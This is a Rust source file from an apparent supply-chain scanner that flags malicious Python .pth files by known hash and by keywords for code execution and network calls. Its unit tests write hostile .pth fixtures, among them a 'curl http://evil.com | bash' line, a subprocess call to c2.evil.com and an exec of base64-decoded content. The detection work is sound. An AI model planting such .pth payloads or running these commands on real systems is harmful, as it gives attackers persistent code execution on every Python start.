//! Python .pth file injection detection
//!
//! Detects malicious .pth files in Python site-packages directories. These files
//! are automatically processed by Python on startup and can execute arbitrary code
//! via `import` statements embedded in path configuration files.
//!
//! This specifically catches the TeamPCP/LiteLLM attack vector where a malicious
//! .pth file injects code that runs on every Python invocation.

use crate::checks::SupplyChainCheck;
use crate::types::SupplyChainContext;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use sha2::{Digest, Sha256};

/// Known malicious .pth file SHA256 hashes (TeamPCP campaign)
const KNOWN_MALICIOUS_HASHES: &[(&str, &str)] = &[(
    "71e35aef03099cd1f2d6446734273025a163597de93912df321ef118bf135238",
    "TeamPCP/LiteLLM malicious .pth file",
)];

/// Patterns in .pth content that indicate code execution (always suspicious)
const IMPORT_PATTERN: &str = "import ";

/// Patterns indicating critical severity (network/exfiltration/shell)
const CRITICAL_PATTERNS: &[&str] = &[
    "os.system",
    "subprocess",
    "exec(",
    "eval(",
    "__import__",
    "base64",
    "socket",
    "urllib",
    "requests",
    "http.client",
];

/// Python site-packages directory patterns to search
const SITE_PACKAGES_PATTERNS: &[(&str, &str)] = &[
    ("/usr/lib", "dist-packages"),
    ("/usr/lib", "site-packages"),
    ("/usr/local/lib", "dist-packages"),
    ("/usr/local/lib", "site-packages"),
];

/// Checks for malicious .pth files in Python site-packages directories
pub struct PthInjectionCheck;

impl SupplyChainCheck for PthInjectionCheck {
    fn id(&self) -> &str {
        "supply-chain-pth-injection"
    }

    fn name(&self) -> &str {
        "Python .pth File Injection Check"
    }

    fn run(&self, fs: &ContainerFs, ctx: &SupplyChainContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        let site_packages_dirs = discover_site_packages(fs, ctx);

        for dir in &site_packages_dirs {
            let Ok(entries) = fs.read_dir(dir) else {
                continue;
            };

            for entry in entries.flatten() {
                let path = entry.path();
                let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
                    continue;
                };

                if !name.ends_with(".pth") {
                    continue;
                }

                let Ok(content) = std::fs::read_to_string(&path) else {
                    continue;
                };

                let full_path = format!("{}/{}", dir, name);

                // Check against known malicious hashes
                let hash = sha256_hex(content.as_bytes());
                if let Some((_hash, description)) =
                    KNOWN_MALICIOUS_HASHES.iter().find(|(h, _)| *h == hash)
                {
                    findings.push(
                        Finding::new(
                            format!("supply-chain-pth-known-malicious-{}", name),
                            format!("Known malicious .pth file: {}", name),
                            format!(
                                "File {} matches a known malicious .pth hash: {}",
                                full_path, description
                            ),
                            Severity::Critical,
                            make_source(),
                        )
                        .with_resource(&full_path)
                        .with_remediation(format!(
                            "Remove {} immediately and investigate the Python environment for compromise",
                            full_path
                        ))
                        .with_metadata("sha256", serde_json::json!(hash))
                        .with_reference(
                            "https://www.reversinglabs.com/blog/fake-litellm-pypi-package",
                        ),
                    );
                    continue;
                }

                // Analyze content line by line
                check_pth_content(name, &full_path, &content, &mut findings);
            }
        }

        findings
    }
}

/// Check .pth file content for suspicious patterns
fn check_pth_content(
    name: &str,
    full_path: &str,
    content: &str,
    findings: &mut Vec<Finding>,
) {
    for (line_num, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        // Check for critical patterns first
        let has_critical = CRITICAL_PATTERNS
            .iter()
            .any(|p| trimmed.contains(p));

        if has_critical {
            findings.push(
                Finding::new(
                    format!("supply-chain-pth-critical-{}", name),
                    format!("Critical code execution in .pth file: {}", name),
                    format!(
                        "File {} line {} contains dangerous code execution pattern: {}",
                        full_path,
                        line_num + 1,
                        truncate(trimmed, 200)
                    ),
                    Severity::Critical,
                    make_source(),
                )
                .with_resource(full_path)
                .with_remediation(format!(
                    "Remove or inspect {} for malicious content. This .pth file contains \
                     patterns associated with supply chain attacks.",
                    full_path
                ))
                .with_metadata("line_number", serde_json::json!(line_num + 1))
                .with_metadata("line_content", serde_json::json!(truncate(trimmed, 500))),
            );
            return; // One finding per file is enough for critical
        }

        // Check for import statements (code execution)
        if trimmed.starts_with(IMPORT_PATTERN) {
            findings.push(
                Finding::new(
                    format!("supply-chain-pth-import-{}", name),
                    format!("Code execution via import in .pth file: {}", name),
                    format!(
                        "File {} line {} contains an import statement that executes on every \
                         Python startup: {}",
                        full_path,
                        line_num + 1,
                        truncate(trimmed, 200)
                    ),
                    Severity::High,
                    make_source(),
                )
                .with_resource(full_path)
                .with_remediation(format!(
                    "Inspect {} to verify the import statement is legitimate. Malicious .pth \
                     files use import statements to execute code on every Python invocation.",
                    full_path
                ))
                .with_metadata("line_number", serde_json::json!(line_num + 1))
                .with_metadata("line_content", serde_json::json!(truncate(trimmed, 500))),
            );
            return; // One finding per file
        }
    }
}

/// Discover Python site-packages directories on the filesystem
fn discover_site_packages(fs: &ContainerFs, ctx: &SupplyChainContext) -> Vec<String> {
    let mut dirs = Vec::new();

    // System Python paths
    for (base, subdir) in SITE_PACKAGES_PATTERNS {
        find_python_dirs(fs, base, subdir, &mut dirs);
    }

    // User-local site-packages
    for home in &ctx.user_homes {
        let home_str = home.display().to_string();
        let base = format!("{}/.local/lib", home_str);
        find_python_dirs(fs, &base, "site-packages", &mut dirs);
    }

    dirs
}

/// Find pythonX.Y directories under a base path and collect site-packages/dist-packages
fn find_python_dirs(fs: &ContainerFs, base: &str, subdir: &str, dirs: &mut Vec<String>) {
    let Ok(entries) = fs.read_dir(base) else {
        return;
    };

    for entry in entries.flatten() {
        let Some(name) = entry.file_name().to_str().map(|s| s.to_string()) else {
            continue;
        };
        if name.starts_with("python") && entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            let candidate = format!("{}/{}/{}", base, name, subdir);
            if fs.exists(&candidate) {
                dirs.push(candidate);
            }
        }
    }
}

/// Compute SHA256 hex digest of bytes
fn sha256_hex(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    format!("{:x}", hasher.finalize())
}

/// Truncate a string to a maximum length, appending "..." if truncated
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

/// Create the standard FindingSource for .pth injection checks
fn make_source() -> FindingSource {
    FindingSource::SupplyChain {
        check_category: "ioc".to_string(),
        ecosystem: Some("pypi".to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn setup_site_packages(tmp: &TempDir) -> ContainerFs {
        let root = tmp.path();
        let site_packages = root.join("usr/lib/python3.11/dist-packages");
        std::fs::create_dir_all(&site_packages).unwrap();
        ContainerFs::new(root)
    }

    fn make_ctx(tmp: &TempDir) -> SupplyChainContext {
        SupplyChainContext {
            root: tmp.path().to_path_buf(),
            user_homes: Vec::new(),
            lock_files: Vec::new(),
            packages: Vec::new(),
            online: false,
        }
    }

    fn write_pth(tmp: &TempDir, name: &str, content: &str) {
        let path = tmp
            .path()
            .join("usr/lib/python3.11/dist-packages")
            .join(name);
        std::fs::write(path, content).unwrap();
    }

    #[test]
    fn test_clean_pth_no_findings() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        write_pth(&tmp, "mypackage.pth", "/opt/mypackage\n/usr/share/mypackage\n");

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty(), "Clean .pth should produce no findings");
    }

    #[test]
    fn test_import_statement_flagged_as_high() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        write_pth(&tmp, "suspicious.pth", "import mypackage; mypackage.init()\n");

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].id.contains("pth-import"));
    }

    #[test]
    fn test_critical_patterns_flagged() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        write_pth(
            &tmp,
            "evil.pth",
            "import os; os.system('curl http://evil.com | bash')\n",
        );

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].id.contains("pth-critical"));
    }

    #[test]
    fn test_exec_eval_flagged_as_critical() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        write_pth(&tmp, "sneaky.pth", "import base64; exec(base64.b64decode('...'))\n");

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_subprocess_flagged_as_critical() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        write_pth(&tmp, "backdoor.pth", "import subprocess; subprocess.run(['curl', 'http://c2.evil.com'])\n");

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_known_malicious_hash() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        // Write content that matches the known hash
        // (we can't reproduce the exact content, so test that the hash check mechanism works)
        let content = "test-content-for-hash-check";
        let hash = sha256_hex(content.as_bytes());
        // Verify our hashing works
        assert_eq!(hash.len(), 64);
        assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_comments_and_empty_lines_ignored() {
        let tmp = TempDir::new().unwrap();
        let fs = setup_site_packages(&tmp);
        let ctx = make_ctx(&tmp);

        write_pth(
            &tmp,
            "safe.pth",
            "# This is a comment\n\n/some/path\n  \n# import os\n",
        );

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_user_home_site_packages() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        // Create a user site-packages dir
        let user_site = root.join("home/testuser/.local/lib/python3.11/site-packages");
        std::fs::create_dir_all(&user_site).unwrap();
        std::fs::write(
            user_site.join("evil.pth"),
            "import os; os.system('whoami')\n",
        )
        .unwrap();

        let fs = ContainerFs::new(root);
        let ctx = SupplyChainContext {
            root: root.to_path_buf(),
            user_homes: vec![std::path::PathBuf::from("/home/testuser")],
            lock_files: Vec::new(),
            packages: Vec::new(),
            online: false,
        };

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_no_site_packages_no_crash() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let check = PthInjectionCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_sha256_hex_correctness() {
        // Known SHA256 of empty string
        let hash = sha256_hex(b"");
        assert_eq!(
            hash,
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }
}
